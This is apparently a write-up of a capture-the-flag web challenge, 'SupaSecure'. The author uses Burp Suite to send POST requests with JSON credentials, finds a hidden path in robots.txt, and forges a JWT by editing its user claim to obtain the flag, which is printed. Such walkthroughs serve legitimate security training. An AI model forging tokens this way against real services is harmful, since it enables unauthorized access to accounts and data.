<p align="center">
  <img width="600" src="challenge.PNG" alt="Challenge Description">
</p>
<h1 align="center" style="margin-top: 0px;">SupaSecure</h1>

<p>Alright, let's get a quick look at this website, https://supasecure.crikeyconctf.com/</p>

![image](https://user-images.githubusercontent.com/104875856/188298655-26880a8e-dc51-44ee-873a-0304d8fe2c11.png)

We get this very modern looking web-page. I'm eager to get logged in so let's check out `/login`.

![image](https://user-images.githubusercontent.com/104875856/188298672-d94157ad-75ea-46a4-96b3-04c610c0102e.png)

Hmm, nothing to `GET` here, then let's try make a `POST` request to this page instead. Burpsuite makes this kind of thing really easy to do.

## Burpsuite is bery buseful I bromise

Using burpsuite we can intercept the request made when we try to go to the webpage `https://supasecure.crikeyconctf.com/login`. Here's that intercepted request.

![image](https://user-images.githubusercontent.com/104875856/188298811-5cf6e9a7-284f-4f8e-b2eb-bacca785bc54.png)

If burpsuite is completely new to you then you should definitely learn how to use it. There's plenty of tutorials on how to use it and it will be one of your most valuable tools when doing web challenges. Anyway, once we've got that `GET` request intercepted we'll send it to burpsuites `repeater`. This'll let us `repeat` and edit this exact request as many times as we want.

Like I said earlier, we want to make a `POST` request instead of a `GET` request. Once we're in the repeater this becomes very easy to do, just right-click on the request you imported and press `change request method` and boom, burpsuite automagically changes your request method. Here's that new request it made,

```
POST /login HTTP/2
Host: supasecure.crikeyconctf.com
Cache-Control: max-age=0
Sec-Ch-Ua: " Not A;Brand";v="99", "Chromium";v="104"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Content-Type: application/x-www-form-urlencoded
Content-Length: 0
```

Awesome, now we can just send this payload and observe the response.

![image](https://user-images.githubusercontent.com/104875856/188298988-c7bd3799-ed75-4cd2-9b07-cab0883e6e5c.png)

Oooo, that's interesting. Looks like the page expected some data coming with the `POST` request. Now, it's important to notice here that the page was expecting `JSON` data. To send `JSON` data in your requests you need to specify that that's the kind of data that you're sending, so the server that's receiving it knows how to interpret it. To do that we use a Header called `Content-Type`, and you can see in our earlier requests that that header is set to `application/x-www-form-urlencoded`. This is simply telling the server that we're sending url encoded information.

Now, to send `JSON` data, all we need to do is change that Header to `application/json`. *The author even hints at this a little*

![image](https://user-images.githubusercontent.com/104875856/188299333-9a864c02-13f3-4502-bd5d-cf60381b145b.png)

If you're interested you can look at all the different values for the `Content-Type` header <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Basics_of_HTTP/MIME_types">HERE</a>. But just changing that doesn't fix our problem, the server said it was expecting something like `{"user":"user","pass":"user"}` so let's give it that. Editing our request to include that `JSON` looks like this,

```
POST /login HTTP/2
Host: supasecure.crikeyconctf.com
Cache-Control: max-age=0
Sec-Ch-Ua: " Not A;Brand";v="99", "Chromium";v="104"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Content-Type: application/json
Content-Length: 42

{
"user":"APender",
"pass":"test"
}
```

![image](https://user-images.githubusercontent.com/104875856/188299761-3221e738-e6db-49fa-96b1-548db0fe00ee.png)

UH OH... I know what this is, do you?

## JWT (JSON Web Tokens)

Yeah, this is where experience comes in. Just like you might immediately recognise the base64 in that response, I immediately recognise a JWT token. The big give away is both the base64 and the '.'s separating parts of the token, typically it will look something like `xxxxx.yyyyy.zzzzz`.

There's a great tool at <a href="https://jwt.io/">https://jwt.io/</a> which lets you debug these tokens. Let's take a look at the token we got in that debugger,

![image](https://user-images.githubusercontent.com/104875856/188300310-f0091036-c4eb-463e-9c9e-bc2d71987f3f.png)

Okay cool, so on the right hand side you can see what that `JWT` token is saying about us. It says we're a `user` with the status `guest`. The first thing I thought to do was just to change that `guest` parameter to `admin`. Just changing that in the debugger gives us a new token holding that information that we gave it,

```
GUEST JWT:
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiZ3Vlc3QifQ._4hr9x7RK_8dsAxQDwg-OJkoHgfvYu6-D5KRgv9uTH0
ADMIN JWT:
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYWRtaW4ifQ.xLtLdUxXsGB7EqP49a8xQziqpjkVKeJ9o2nix4xLf5M
```

Okayy, so we know we generate and change a JWT token...but where do we actually use it? I was stumped here for a good 30 minutes, I tried providing the `Admin JWT` through several common headers through which they're normally obtained, like `X-Auth-Token` and `Authorization`, but reloading each page with that header set yielded no difference in response.

Hmm, I must've missed something.

## Enumerate dummy! Enumerate dummy/robots.txt!

**Always. Check. Robots.txt.**

I usually check it every single time I do a web challenge but for some reason I just didn't this time, and this is a common problem you'll face in web challenges. Just missing a small thing that you're so used to doing that you don't even think about can cost you hours.

If you've never heard of the /robots.txt file, well, welcome to CTF's. The robots.txt file is a file that defines what 'bots' can and can't access on your website.
This is what a robots.txt file might look like,
```
User-agent: *
Disallow: /cgi-bin/
Disallow: /tmp/
Disallow: /junk/
```
This says that 'robots' or 'bots' aren't allowed to enter the subdirectories `/cgi-bin/`, `/tmp/` or `/junk/`

Anyway, this file is VERY popular in beginner CTF's as a place to hide information, subdirectories or even flags sometimes. So it should be common practice to always check robots.txt when you come across a web challenge.

Looking inside this...

![image](https://user-images.githubusercontent.com/104875856/188303089-52df38b3-0f3a-4753-b758-b127810f355c.png)

AHHH, it was right there all along! There's a `/supasecure` subdirectory!

If you do a `GET` request to this directory you get the `Nothing to GET here` response, so we do a `POST` request with burpsuite.

![image](https://user-images.githubusercontent.com/104875856/188303151-d93edbbe-2fc9-460b-955a-32a0f6392ef4.png)

That's it! Here's where we use out JWT token, it want's us to pass it in as `JSON` so we do exactly like we did with the user and password. I'll do a `POST` request with our original token (the one that says we're `guest`), just to see the response. That request looks like this,
```
POST /supasecure HTTP/2
Host: supasecure.crikeyconctf.com
Cache-Control: max-age=0
Sec-Ch-Ua: " Not A;Brand";v="99", "Chromium";v="104"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Content-Type: application/json
Content-Length: 115

{
  "token":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiZ3Vlc3QifQ._4hr9x7RK_8dsAxQDwg-OJkoHgfvYu6-D5KRgv9uTH0"
}
```

Here's the response we get.

![image](https://user-images.githubusercontent.com/104875856/188303262-30a50f10-a40b-4611-b324-beacd6b941ce.png)

Ah, the solutions clear now. All we have to do is go back to our debugger, change the `guest` field of our `JWT` token to `droppy` and send a `POST` request using that token. Our token is now, `eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiZHJvcHB5In0.VowEtTnbDRUIcQr04fIsK8NnMyxMB5abfhviSyYjELY`.

Sending that request through...

![image](https://user-images.githubusercontent.com/104875856/188303351-72155d62-74b7-43ed-a5d4-8375b8c07ce3.png)

BAM there's the flag!

**flag{maybe_not_so_supasecure}**




